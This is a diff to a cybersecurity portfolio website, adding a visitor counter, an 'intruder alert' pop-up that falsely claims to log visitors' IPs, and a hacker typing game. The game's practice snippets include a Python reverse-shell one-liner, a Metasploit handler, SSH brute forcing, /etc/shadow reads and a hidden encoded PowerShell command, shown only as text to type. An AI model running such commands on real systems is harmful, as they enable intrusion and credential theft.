@@ -5,6 +5,88 @@
 <title>Ankesh Prajapati | CyberSec Desktop</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<!-- Animated Favicon -->
+<link id="favicon" rel="icon" type="image/png" href=""/>
+<script>
+(function(){
+  var canvas = document.createElement('canvas');
+  canvas.width = 32; canvas.height = 32;
+  var ctx = canvas.getContext('2d');
+  var favicon = null;
+  var frame = 0;
+  var glitchTimer = 0;
+  var glitching = false;
+
+  // Matrix rain drops for favicon
+  var drops = [];
+  var chars = '01アイウエオカキ<>{}[]#$%@!';
+  for(var i=0;i<4;i++) drops.push({x:i*8+4, y:Math.random()*32, speed:1+Math.random()*1.5, char:chars[Math.floor(Math.random()*chars.length)]});
+
+  function drawFavicon(){
+    ctx.clearRect(0,0,32,32);
+
+    // Background
+    ctx.fillStyle = '#0d1117';
+    ctx.fillRect(0,0,32,32);
+
+    // Glitch effect trigger
+    glitchTimer++;
+    if(glitchTimer > 60 && Math.random() < 0.03){ glitching = true; glitchTimer = 0; }
+    if(glitching && Math.random() < 0.3) glitching = false;
+
+    // Animated border glow (pulsing)
+    var pulse = 0.4 + 0.6 * Math.abs(Math.sin(frame * 0.05));
+    ctx.strokeStyle = 'rgba(0,255,157,' + pulse + ')';
+    ctx.lineWidth = 1.5;
+    ctx.strokeRect(1, 1, 30, 30);
+
+    // Corner brackets
+    ctx.strokeStyle = '#00ff9d';
+    ctx.lineWidth = 2;
+    var s = 6;
+    // TL
+    ctx.beginPath(); ctx.moveTo(2,2+s); ctx.lineTo(2,2); ctx.lineTo(2+s,2); ctx.stroke();
+    // TR
+    ctx.beginPath(); ctx.moveTo(30-s,2); ctx.lineTo(30,2); ctx.lineTo(30,2+s); ctx.stroke();
+    // BL
+    ctx.beginPath(); ctx.moveTo(2,30-s); ctx.lineTo(2,30); ctx.lineTo(2+s,30); ctx.stroke();
+    // BR
+    ctx.beginPath(); ctx.moveTo(30-s,30); ctx.lineTo(30,30); ctx.lineTo(30,30-s); ctx.stroke();
+
+    // Matrix rain columns
+    drops.forEach(function(d){
+      var alpha = glitching ? Math.random() : (0.3 + 0.7*(1-(d.y/32)));
+      ctx.fillStyle = 'rgba(0,255,157,'+alpha+')';
+      ctx.font = 'bold 7px monospace';
+      if(Math.random() < 0.1) d.char = chars[Math.floor(Math.random()*chars.length)];
+      ctx.fillText(d.char, d.x-3, d.y);
+      d.y += d.speed;
+      if(d.y > 34){ d.y = -4; d.char = chars[Math.floor(Math.random()*chars.length)]; }
+    });
+
+    // Center shield/lock icon
+    ctx.fillStyle = glitching ? '#ff3355' : '#00ff9d';
+    ctx.font = 'bold 13px monospace';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    // Glitch offset
+    var gx = glitching ? (Math.random()*4-2) : 0;
+    var gy = glitching ? (Math.random()*4-2) : 0;
+    ctx.fillText('🔒', 16+gx, 16+gy);
+
+    // Scan line sweep
+    var scanY = (frame * 0.8) % 32;
+    ctx.fillStyle = 'rgba(0,255,157,0.12)';
+    ctx.fillRect(0, scanY, 32, 2);
+
+    frame++;
+    favicon = document.getElementById('favicon');
+    if(favicon) favicon.href = canvas.toDataURL('image/png');
+    requestAnimationFrame(drawFavicon);
+  }
+  window.addEventListener('DOMContentLoaded', drawFavicon);
+})();
+</script>
 <style>
 :root {
   --bg: #0d1117;
@@ -47,15 +129,23 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospa
 
 /* Desktop icons */
 .desktop-icons{
-  position:absolute;top:12px;left:0;right:0;bottom:0;
-  display:flex;flex-direction:column;flex-wrap:wrap;
-  align-content:flex-start;
-  gap:4px;padding:12px 10px;z-index:2;
+  position:fixed;
+  top:8px; right:8px; bottom:52px; left:auto;
+  width:76px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:flex-start;
+  gap:2px;
+  padding:4px 0;
+  z-index:2;
   pointer-events:none;
+  overflow-y:auto;
+  overflow-x:hidden;
 }
 .icon{
-  display:flex;flex-direction:column;align-items:center;gap:4px;
-  padding:8px 6px;border-radius:8px;cursor:pointer;
+  display:flex;flex-direction:column;align-items:center;gap:2px;
+  padding:6px 4px;border-radius:8px;cursor:pointer;
   transition:background 0.2s,transform 0.15s;
   width:72px;user-select:none;pointer-events:all;
   flex-shrink:0;
@@ -63,14 +153,14 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospa
 .icon:hover{background:rgba(var(--accent-rgb),0.13);transform:scale(1.06);}
 .icon:active{background:rgba(var(--accent-rgb),0.22);transform:scale(0.97);}
 .icon-img{
-  font-size:1.7rem;
+  font-size:1.5rem;
   filter:drop-shadow(0 0 6px var(--accent));
   line-height:1;
 }
 .icon-label{
-  font-size:0.62rem;color:#e0f0ea;text-align:center;
+  font-size:0.58rem;color:#e0f0ea;text-align:center;
   text-shadow:0 1px 6px #000,0 0 12px #000;
-  word-break:break-word;line-height:1.3;
+  word-break:break-word;line-height:1.2;
   max-width:68px;
 }
 
@@ -585,26 +675,26 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospa
   }
   .win-resize{display:none!important;}
 
-  /* Desktop icon bar - horizontal strip above taskbar */
-  .desktop-icons{
+  /* Mobile: horizontal scrollable icon dock above taskbar */
+  #desktopIcons{
     position:fixed!important;
     left:0!important;right:0!important;
     bottom:44px!important;top:auto!important;
-    width:100vw!important;height:64px!important;
+    width:100vw!important;height:68px!important;
     flex-direction:row!important;
     flex-wrap:nowrap!important;
     overflow-x:auto!important;overflow-y:hidden!important;
     align-items:center!important;
     justify-content:flex-start!important;
-    padding:4px 8px!important;
-    background:rgba(13,17,23,0.96)!important;
+    padding:4px 10px!important;
+    background:rgba(13,17,23,0.97)!important;
     border-top:1px solid var(--border)!important;
     z-index:9998!important;
     gap:6px!important;
     -webkit-overflow-scrolling:touch;
     scrollbar-width:none;
   }
-  .desktop-icons::-webkit-scrollbar{display:none;}
+  #desktopIcons::-webkit-scrollbar{display:none;}
   .icon{
     width:54px!important;flex-shrink:0!important;
     padding:5px 4px!important;touch-action:manipulation;
@@ -687,7 +777,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospa
   <canvas id="desktopBg"></canvas>
 
   <!-- Desktop Icons -->
-  <div class="desktop-icons" style="left:auto;right:0;top:0;bottom:0;width:82px;flex-direction:column;flex-wrap:nowrap;overflow-y:auto;overflow-x:hidden;align-items:center;padding:10px 5px;">
+  <div class="desktop-icons" id="desktopIcons">
     <div class="icon" ondblclick="openWindow('about')" ontouchend="iconTap(event,'about')" title="About Me">
       <div class="icon-img">👤</div>
       <div class="icon-label">about.sh</div>
@@ -728,6 +818,10 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospa
       <div class="icon-img">🐍</div>
       <div class="icon-label">snake.exe</div>
     </div>
+    <div class="icon" ondblclick="openWindow('typingtest')" ontouchend="iconTap(event,'typingtest')" title="Hack Typing Test">
+      <div class="icon-img">⌨️</div>
+      <div class="icon-label">hack.exe</div>
+    </div>
   </div>
 </div>
 
@@ -759,6 +853,11 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospa
         <rect id="battFill" x="3" y="4" width="16" height="6" rx="1" fill="currentColor" stroke="none"/>
       </svg>
     </span>
+  </div>
+  <div class="taskbar-sep"></div>
+  <div id="visitorCounter" style="font-size:0.72rem;color:var(--muted);white-space:nowrap;padding:0 8px;display:flex;align-items:center;gap:5px;cursor:default;" title="Total unique visitors">
+    <span style="opacity:0.6;font-size:0.65rem;">👁</span>
+    <span id="visitorCount" style="color:var(--accent);font-weight:600;font-variant-numeric:tabular-nums;letter-spacing:0.03em;">...</span>
   </div>
   <div class="taskbar-clock" id="clock"></div>
 </div>
@@ -797,6 +896,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:"Fira Code",monospa
   <div class="sm-item" onclick="openWindow('neofetch');hideStart()">🖥️ <span>neofetch</span><em>System Info</em></div>
   <div class="sm-item" onclick="openWindow('wallpaper');hideStart()">🎨 <span>theme</span><em>Appearance</em></div>
   <div class="sm-item" onclick="openWindow('snake');hideStart()">🐍 <span>snake.exe</span><em>Leaderboard</em></div>
+  <div class="sm-item" onclick="openWindow('typingtest');hideStart()">⌨️ <span>hack.exe</span><em>Typing Test</em></div>
   <div class="sm-sep"></div>
   <div class="sm-item sm-danger" onclick="closeAllWindows();hideStart()">✕ <span>Close All Windows</span><em></em></div>
 </div>
@@ -1494,6 +1594,7 @@ function initDesktopBg(){
   }
   draw();
 }
+
 // ===================== CLOCK =====================
 function updateClock(){
   const now=new Date();
@@ -1536,6 +1637,7 @@ function openWindow(name){
   updateTaskbar();
   if(name==="skills")setTimeout(animateSkillBars,100);
   if(name==="Theme"){setTimeout(()=>{buildPresetGrid();initThemeWheel();},60);}
+  if(name==="typingtest"){setTimeout(()=>{if(!ttSnippet){ttSnippet=getTTSnippet();}renderTTDisplay(document.getElementById("ttInput")?.value||"");},80);}
   showNotif("Opened","~/"+name+" loaded successfully");
 }
 
@@ -1587,8 +1689,8 @@ document.addEventListener("mousedown",(e)=>{
 function updateTaskbar(){
   const tasks=document.getElementById("taskbarTasks");
   tasks.innerHTML="";
-  const wins=["about","skills","experience","projects","certs","contact","terminal","neofetch","wallpaper","snake"];
-  const labels={"about":"👤 about","skills":"⚡ skills","experience":"📋 experience","projects":"🛡️ projects","certs":"🎓 certs","contact":"📡 contact","terminal":"💻 terminal","neofetch":"🖥️ neofetch","wallpaper":"🎨 theme","snake":"🐍 snake"};
+  const wins=["about","skills","experience","projects","certs","contact","terminal","neofetch","wallpaper","snake","typingtest"];
+  const labels={"about":"👤 about","skills":"⚡ skills","experience":"📋 experience","projects":"🛡️ projects","certs":"🎓 certs","contact":"📡 contact","terminal":"💻 terminal","neofetch":"🖥️ neofetch","wallpaper":"🎨 theme","snake":"🐍 snake","typingtest":"⌨️ hack.exe"};
   wins.forEach(n=>{
     const win=document.getElementById("win-"+n);
     if(!win||win.style.display==="none")return;
@@ -1915,7 +2017,7 @@ document.addEventListener("click",(e)=>{
 document.addEventListener("contextmenu",(e)=>{if(e.target===document.body||e.target===document.getElementById("desktop")||e.target.id==="desktop")return;hideCtx();});
 
 function openAllWindows(){["about","skills","experience","projects","certs","contact","terminal","neofetch"].forEach(openWindow);}
-function closeAllWindows(){["about","skills","experience","projects","certs","contact","terminal","neofetch","wallpaper","snake"].forEach(closeWindow);}
+function closeAllWindows(){["about","skills","experience","projects","certs","contact","terminal","neofetch","wallpaper","snake","typingtest"].forEach(closeWindow);}
 
 // ===================== NOTIFICATIONS =====================
 let notifTimeout;
@@ -2640,9 +2742,399 @@ function triggerShutdown(onDone){
     },3500);
   },4000);
 }
+
+// ══════════════════════════════════════════════════════════════════
+// VISITOR COUNTER — uses countapi.xyz (free, persistent, no reset)
+// ══════════════════════════════════════════════════════════════════
+(function initVisitorCounter(){
+  const EL = document.getElementById("visitorCount");
+  // countapi.xyz: hit() increments on every page load and returns the new count
+  // namespace = your domain/name, key = unique key for this counter
+  fetch("https://api.countapi.xyz/hit/ankesh-prajapati-portfolio/visitors")
+    .then(r => r.json())
+    .then(data => {
+      const count = data.value || 0;
+      // Animate count up from 0
+      let current = Math.max(0, count - 15);
+      const step = Math.ceil((count - current) / 30);
+      const ticker = setInterval(() => {
+        current = Math.min(count, current + step);
+        if(EL) EL.textContent = current.toLocaleString();
+        if(current >= count){ clearInterval(ticker); if(EL) EL.textContent = count.toLocaleString(); }
+      }, 40);
+      // Fire the intruder alert toast after boot finishes (3.5s delay)
+      setTimeout(() => showIntruderAlert(count), 3600);
+    })
+    .catch(() => {
+      // Fallback: show a plausible number from localStorage if API fails
+      try {
+        let lv = parseInt(localStorage.getItem("_vc") || "0");
+        lv++;
+        localStorage.setItem("_vc", lv);
+        if(EL) EL.textContent = lv.toLocaleString();
+        setTimeout(() => showIntruderAlert(lv), 3600);
+      } catch(e) { if(EL) EL.textContent = "—"; }
+    });
+})();
+
+// ══════════════════════════════════════════════════════════════════
+// INTRUDER ALERT TOAST — cybersec flavoured pop-up on load
+// ══════════════════════════════════════════════════════════════════
+function showIntruderAlert(count) {
+  // Remove if already exists
+  const old = document.getElementById("intruderToast");
+  if(old) old.remove();
+
+  const toast = document.createElement("div");
+  toast.id = "intruderToast";
+  toast.innerHTML = `
+    <div style="display:flex;align-items:flex-start;gap:10px;">
+      <div style="font-size:1.1rem;flex-shrink:0;margin-top:1px;animation:toastPulse 1s ease-in-out infinite;">⚠</div>
+      <div style="flex:1;">
+        <div style="font-size:0.65rem;color:#ff3355;letter-spacing:0.18em;font-weight:700;margin-bottom:3px;">[ SECURITY ALERT ]</div>
+        <div style="font-size:0.78rem;color:#c9d1d9;line-height:1.5;">Intruder detected on network</div>
+        <div style="font-size:0.7rem;color:#6e7681;margin-top:2px;">Total infiltrations: <span style="color:var(--accent);font-weight:600;">${count.toLocaleString()}</span></div>
+        <div style="font-size:0.62rem;color:#6e7681;margin-top:4px;letter-spacing:0.06em;">IP logged · Tracing route...</div>
+      </div>
+      <div onclick="document.getElementById('intruderToast').remove()" style="cursor:pointer;color:#6e7681;font-size:0.75rem;padding:2px 4px;opacity:0.6;hover:opacity:1;">✕</div>
+    </div>
+    <div style="margin-top:8px;height:2px;background:rgba(255,51,85,0.15);border-radius:1px;overflow:hidden;">
+      <div id="toastProgress" style="height:100%;width:100%;background:linear-gradient(90deg,#ff3355,#ff6b35);border-radius:1px;transition:width linear;"></div>
+    </div>
+  `;
+  toast.style.cssText = `
+    position:fixed;bottom:58px;right:14px;z-index:99998;
+    background:#0d1117;border:1px solid rgba(255,51,85,0.4);border-radius:8px;
+    padding:12px 14px;width:260px;
+    box-shadow:0 4px 24px rgba(0,0,0,0.7),0 0 0 1px rgba(255,51,85,0.1),0 0 20px rgba(255,51,85,0.08);
+    font-family:'Fira Code',monospace;
+    animation:toastSlideIn 0.35s cubic-bezier(0.34,1.56,0.64,1) forwards;
+    backdrop-filter:blur(12px);
+  `;
+
+  // Inject keyframes if not present
+  if(!document.getElementById("toastKeyframes")){
+    const style = document.createElement("style");
+    style.id = "toastKeyframes";
+    style.textContent = `
+      @keyframes toastSlideIn{from{opacity:0;transform:translateY(20px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}
+      @keyframes toastSlideOut{from{opacity:1;transform:translateY(0)}to{opacity:0;transform:translateY(12px)}}
+      @keyframes toastPulse{0%,100%{color:#ff3355}50%{color:#febc2e}}
+    `;
+    document.head.appendChild(style);
+  }
+
+  document.body.appendChild(toast);
+
+  // Shrink progress bar over 5 seconds then auto dismiss
+  const bar = document.getElementById("toastProgress");
+  setTimeout(() => { if(bar) bar.style.width = "0%"; bar.style.transitionDuration = "4.8s"; }, 100);
+  setTimeout(() => {
+    if(toast.parentNode){
+      toast.style.animation = "toastSlideOut 0.3s ease forwards";
+      setTimeout(() => { if(toast.parentNode) toast.remove(); }, 300);
+    }
+  }, 5000);
+}
+
+// ══════════════════════════════════════════════════════════════════
+// HACKER TYPING TEST
+// ══════════════════════════════════════════════════════════════════
+const TT_SNIPPETS = {
+  easy: [
+    'nmap -sV -p 80,443,22 192.168.1.1',
+    'grep -r password /var/log/ 2>/dev/null',
+    'sudo netstat -tulpn | grep LISTEN',
+    'curl -X POST http://target.com/login -d user=admin',
+    'cat /etc/passwd | cut -d: -f1',
+    'ssh root@10.0.0.1 -p 2222 -i id_rsa',
+    'find / -perm -4000 -type f 2>/dev/null',
+    'hydra -l admin -P pass.txt ssh://192.168.0.1',
+    'ping -c 4 8.8.8.8 && echo reachable',
+    'ls -la /home/ && whoami && id',
+  ],
+  hard: [
+    'msfconsole -q -x "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run"',
+    'python3 -c "import socket,os; s=socket.socket(); s.connect((10.0.0.1,4444)); os.dup2(s.fileno(),0)"',
+    'openssl s_client -connect target.com:443 | openssl x509 -noout -text | grep Subject',
+    'awk -F: "{if($3==0)print $1}" /etc/passwd && cat /etc/shadow | grep -v locked',
+    'tcpdump -i eth0 -w capture.pcap port 80 or port 443 && tshark -r capture.pcap -T fields',
+  ],
+  elite: [
+    'import socket,threading; scan=lambda h,p: socket.create_connection((h,p),0.5) and True',
+    'SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE pass;',
+    'powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==',
+    'iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 4 -j DROP',
+    'volatility -f memory.dmp --profile=Win7SP1x64 pstree | grep -E cmd.powershell && malfind',
+  ]
+};
+
+let ttCurrentDiff = 'easy';
+let ttSnippet = '';
+let ttStartTime = null;
+let ttTimer = null;
+let ttTimeLeft = 60;
+let ttTotalTyped = 0;
+let ttCorrectTyped = 0;
+let ttActive = false;
+let ttFinished = false;
+
+function setTTDiff(diff){
+  ttCurrentDiff = diff;
+  ['easy','hard','elite'].forEach(d => {
+    const btn = document.getElementById('ttDiff' + d.charAt(0).toUpperCase() + d.slice(1));
+    if(!btn) return;
+    if(d === diff){
+      btn.style.borderColor = 'rgba(0,255,157,0.3)';
+      btn.style.background = 'rgba(0,255,157,0.12)';
+      btn.style.color = 'var(--accent)';
+    } else {
+      btn.style.borderColor = '#30363d';
+      btn.style.background = 'transparent';
+      btn.style.color = '#6e7681';
+    }
+  });
+}
+
+function getTTSnippet(){
+  const pool = TT_SNIPPETS[ttCurrentDiff];
+  return pool[Math.floor(Math.random() * pool.length)];
+}
+
+function renderTTDisplay(typed){
+  const display = document.getElementById('ttTextDisplay');
+  if(!display) return;
+  let html = '';
+  for(let i = 0; i < ttSnippet.length; i++){
+    const ch = ttSnippet[i];
+    const disp = ch === ' ' ? '&nbsp;' : ch === '\n' ? '<br>' : ch.replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    if(i < typed.length){
+      const correct = typed[i] === ttSnippet[i];
+      html += `<span style="color:${correct ? '#00ff9d' : '#ff3355'};${!correct ? 'background:rgba(255,51,85,0.15);border-radius:2px;' : ''}">${disp}</span>`;
+    } else if(i === typed.length){
+      html += `<span style="color:#c9d1d9;text-decoration:underline;text-decoration-color:var(--accent);animation:tblink 1s step-end infinite;">${disp}</span>`;
+    } else {
+      html += `<span style="color:#2d3748;">${disp}</span>`;
+    }
+  }
+  display.innerHTML = html;
+
+  // Update progress
+  const pct = Math.round((typed.length / ttSnippet.length) * 100);
+  const prog = document.getElementById('ttProgress');
+  if(prog) prog.textContent = pct + '% complete';
+}
+
+function onTTInput(){
+  const input = document.getElementById('ttInput');
+  if(!input || ttFinished) return;
+  const typed = input.value;
+
+  if(!ttActive && typed.length > 0){
+    ttActive = true;
+    ttStartTime = Date.now();
+    ttTimer = setInterval(updateTTTimer, 1000);
+  }
+
+  ttTotalTyped = typed.length;
+  // Count correct chars
+  ttCorrectTyped = 0;
+  for(let i = 0; i < Math.min(typed.length, ttSnippet.length); i++){
+    if(typed[i] === ttSnippet[i]) ttCorrectTyped++;
+  }
+
+  renderTTDisplay(typed);
+  updateTTStats();
+
+  // Check completion
+  if(typed === ttSnippet){
+    finishTypingTest();
+  }
+}
+
+function updateTTTimer(){
+  ttTimeLeft--;
+  const el = document.getElementById('ttTime');
+  if(el){
+    el.textContent = ttTimeLeft;
+    el.style.color = ttTimeLeft <= 10 ? '#ff3355' : '#febc2e';
+  }
+  if(ttTimeLeft <= 0) finishTypingTest();
+}
+
+function updateTTStats(){
+  if(!ttActive || !ttStartTime) return;
+  const elapsed = (Date.now() - ttStartTime) / 1000 / 60; // minutes
+  const wpm = elapsed > 0 ? Math.round((ttCorrectTyped / 5) / elapsed) : 0;
+  const acc = ttTotalTyped > 0 ? Math.round((ttCorrectTyped / ttTotalTyped) * 100) : 100;
+  const wpmEl = document.getElementById('ttWpm');
+  const accEl = document.getElementById('ttAcc');
+  if(wpmEl) wpmEl.textContent = wpm;
+  if(accEl) accEl.textContent = acc + '%';
+}
+
+function finishTypingTest(){
+  if(ttFinished) return;
+  ttFinished = true;
+  clearInterval(ttTimer);
+
+  const elapsed = ttStartTime ? (Date.now() - ttStartTime) / 1000 : 60;
+  const mins = elapsed / 60;
+  const wpm = mins > 0 ? Math.round((ttCorrectTyped / 5) / mins) : 0;
+  const acc = ttTotalTyped > 0 ? Math.round((ttCorrectTyped / ttTotalTyped) * 100) : 100;
+
+  let rank = '[ SCRIPT KIDDIE ]';
+  if(wpm >= 80 && acc >= 95) rank = '[ ELITE HACKER ]';
+  else if(wpm >= 60 && acc >= 90) rank = '[ RED TEAMER ]';
+  else if(wpm >= 40 && acc >= 85) rank = '[ PENTESTER ]';
+  else if(wpm >= 25) rank = '[ ANALYST ]';
+
+  document.getElementById('ttFinalWpm').textContent = wpm + ' WPM';
+  document.getElementById('ttFinalAcc').textContent = acc + '%';
+  document.getElementById('ttFinalTime').textContent = Math.round(elapsed) + 's';
+  document.getElementById('ttFinalRank').textContent = rank;
+
+  const res = document.getElementById('ttResults');
+  if(res){ res.style.display = 'flex'; }
+}
+
+function resetTypingTest(){
+  ttActive = false;
+  ttFinished = false;
+  ttStartTime = null;
+  ttTotalTyped = 0;
+  ttCorrectTyped = 0;
+  ttTimeLeft = 60;
+  clearInterval(ttTimer);
+
+  const input = document.getElementById('ttInput');
+  if(input){ input.value = ''; input.disabled = false; }
+  const timeEl = document.getElementById('ttTime');
+  if(timeEl){ timeEl.textContent = '60'; timeEl.style.color = '#febc2e'; }
+  const wpmEl = document.getElementById('ttWpm');
+  if(wpmEl) wpmEl.textContent = '—';
+  const accEl = document.getElementById('ttAcc');
+  if(accEl) accEl.textContent = '—';
+  const res = document.getElementById('ttResults');
+  if(res) res.style.display = 'none';
+  const prog = document.getElementById('ttProgress');
+  if(prog) prog.textContent = '';
+
+  ttSnippet = getTTSnippet();
+  renderTTDisplay('');
+
+  // Tab key to restart
+  if(input) input.focus();
+}
+
+// Init typing test when window opens (patch openWindow)
+// typing test init handled inside openWindow
+
+// Tab key shortcut in typing test
+document.addEventListener('keydown', e => {
+  if(e.key === 'Tab' && document.activeElement && document.activeElement.id === 'ttInput'){
+    e.preventDefault();
+    resetTypingTest();
+  }
+});
+// ══ END TYPING TEST ══════════════════════════════════════════════
+
 // ══ END BOOT ═════════════════════════════════════════════════════════════════
 
 </script>
+
+
+<!-- Typing Test Window -->
+<div class="window" id="win-typingtest" style="width:700px;height:480px;top:70px;left:160px;display:none;" data-win="typingtest">
+  <div class="win-titlebar" onmousedown="startDrag(event,'win-typingtest')" ontouchstart="startDragTouch(event,'win-typingtest')">
+    <div class="win-dots">
+      <div class="win-dot close" onclick="closeWindow('typingtest')"></div>
+      <div class="win-dot minimize" onclick="minimizeWindow('typingtest')"></div>
+      <div class="win-dot maximize" onclick="toggleMaximize('typingtest')"></div>
+    </div>
+    <div class="win-title">⌨️ hack.exe — Hacker Typing Challenge</div>
+    <div class="win-title-right"></div>
+  </div>
+  <div class="win-body" style="background:#0a0d0f;display:flex;flex-direction:column;overflow:hidden;">
+
+    <!-- Header stats bar -->
+    <div id="ttHeader" style="display:flex;align-items:center;gap:18px;padding:8px 16px;border-bottom:1px solid #1a2230;flex-shrink:0;background:#0d1117;">
+      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.12em;">WPM</div>
+      <div id="ttWpm" style="font-size:1.1rem;color:var(--accent);font-weight:700;min-width:38px;">—</div>
+      <div style="width:1px;height:20px;background:#30363d;"></div>
+      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.12em;">ACC</div>
+      <div id="ttAcc" style="font-size:1.1rem;color:var(--accent);font-weight:700;min-width:44px;">—</div>
+      <div style="width:1px;height:20px;background:#30363d;"></div>
+      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.12em;">TIME</div>
+      <div id="ttTime" style="font-size:1.1rem;color:#febc2e;font-weight:700;font-variant-numeric:tabular-nums;min-width:32px;">60</div>
+      <div style="flex:1;"></div>
+      <div id="ttDiff" style="display:flex;gap:5px;">
+        <button onclick="setTTDiff('easy')" id="ttDiffEasy" style="padding:3px 10px;border-radius:4px;font-family:inherit;font-size:0.65rem;cursor:pointer;border:1px solid rgba(0,255,157,0.3);background:rgba(0,255,157,0.12);color:var(--accent);letter-spacing:0.05em;">EASY</button>
+        <button onclick="setTTDiff('hard')" id="ttDiffHard" style="padding:3px 10px;border-radius:4px;font-family:inherit;font-size:0.65rem;cursor:pointer;border:1px solid #30363d;background:transparent;color:#6e7681;letter-spacing:0.05em;">HARD</button>
+        <button onclick="setTTDiff('elite')" id="ttDiffElite" style="padding:3px 10px;border-radius:4px;font-family:inherit;font-size:0.65rem;cursor:pointer;border:1px solid #30363d;background:transparent;color:#6e7681;letter-spacing:0.05em;">ELITE</button>
+      </div>
+      <button onclick="resetTypingTest()" style="padding:4px 12px;border-radius:4px;font-family:inherit;font-size:0.68rem;cursor:pointer;border:1px solid #30363d;background:transparent;color:#6e7681;letter-spacing:0.06em;">↺ RESET</button>
+    </div>
+
+    <!-- Text display area -->
+    <div style="flex:1;overflow:hidden;display:flex;flex-direction:column;padding:16px 20px 0;">
+      <!-- Prompt label -->
+      <div id="ttPromptLabel" style="font-size:0.58rem;color:#6e7681;letter-spacing:0.18em;margin-bottom:8px;">[ BREACH CODE — TYPE TO HACK ]</div>
+      <!-- The code to type -->
+      <div id="ttTextDisplay" style="font-size:0.95rem;line-height:1.9;color:#4a5568;letter-spacing:0.03em;word-break:break-all;user-select:none;font-family:'Fira Code',monospace;flex:1;overflow-y:auto;"></div>
+    </div>
+
+    <!-- Input area -->
+    <div style="padding:12px 20px 16px;border-top:1px solid #1a2230;flex-shrink:0;background:#0d1117;">
+      <div style="position:relative;">
+        <textarea id="ttInput"
+          rows="2"
+          placeholder="[ Click here and start typing to begin breach... ]"
+          spellcheck="false" autocorrect="off" autocapitalize="none" autocomplete="off"
+          style="width:100%;background:rgba(0,255,157,0.03);border:1px solid rgba(0,255,157,0.2);border-radius:6px;
+                 padding:10px 14px;font-family:'Fira Code',monospace;font-size:0.88rem;color:var(--accent);
+                 outline:none;resize:none;caret-color:var(--accent);line-height:1.5;letter-spacing:0.03em;
+                 transition:border-color 0.2s;"
+          oninput="onTTInput()"
+          onfocus="this.style.borderColor='rgba(0,255,157,0.5)'"
+          onblur="this.style.borderColor='rgba(0,255,157,0.2)'"
+        ></textarea>
+      </div>
+      <!-- Mini keyboard hint -->
+      <div style="display:flex;gap:12px;align-items:center;margin-top:8px;">
+        <div style="font-size:0.6rem;color:#30363d;letter-spacing:0.1em;">TAB = restart &nbsp;|&nbsp; ESC = reset difficulty</div>
+        <div style="flex:1;"></div>
+        <div id="ttProgress" style="font-size:0.6rem;color:#6e7681;letter-spacing:0.1em;"></div>
+      </div>
+    </div>
+
+    <!-- Results overlay -->
+    <div id="ttResults" style="display:none;position:absolute;inset:0;background:rgba(10,13,15,0.97);flex-direction:column;align-items:center;justify-content:center;gap:14px;z-index:20;">
+      <div style="font-size:0.65rem;color:#6e7681;letter-spacing:0.22em;">[ BREACH COMPLETE ]</div>
+      <div style="font-size:2.4rem;color:var(--accent);font-weight:700;text-shadow:0 0 30px var(--accent);" id="ttFinalWpm">0 WPM</div>
+      <div style="display:flex;gap:24px;margin-top:4px;">
+        <div style="text-align:center;">
+          <div style="font-size:1.2rem;color:var(--accent);" id="ttFinalAcc">0%</div>
+          <div style="font-size:0.6rem;color:#6e7681;margin-top:2px;">ACCURACY</div>
+        </div>
+        <div style="text-align:center;">
+          <div style="font-size:1.2rem;color:#febc2e;" id="ttFinalTime">0s</div>
+          <div style="font-size:0.6rem;color:#6e7681;margin-top:2px;">TIME</div>
+        </div>
+        <div style="text-align:center;">
+          <div style="font-size:1.2rem;color:#58a6ff;" id="ttFinalRank">—</div>
+          <div style="font-size:0.6rem;color:#6e7681;margin-top:2px;">RANK</div>
+        </div>
+      </div>
+      <div style="display:flex;gap:10px;margin-top:10px;">
+        <button onclick="resetTypingTest()" style="padding:9px 26px;border-radius:6px;font-family:inherit;font-size:0.8rem;font-weight:700;cursor:pointer;background:var(--accent);color:#000;border:none;letter-spacing:0.06em;">↺ TRY AGAIN</button>
+        <button onclick="setTTDiff(ttCurrentDiff==='elite'?'easy':ttCurrentDiff==='hard'?'elite':'hard');resetTypingTest()" style="padding:8px 18px;border-radius:6px;font-family:inherit;font-size:0.72rem;cursor:pointer;background:transparent;color:#6e7681;border:1px solid #30363d;">CHANGE DIFF</button>
+      </div>
+    </div>
+
+  </div>
+  <div class="win-resize" onmousedown="startResize(event,'win-typingtest')" ontouchstart="startResizeTouch(event,'win-typingtest')"></div>
+</div>
 
 <!-- Snake Game Window -->
 <div class="window" id="win-snake" style="width:720px;height:480px;top:50px;left:100px;display:none;" data-win="snake">
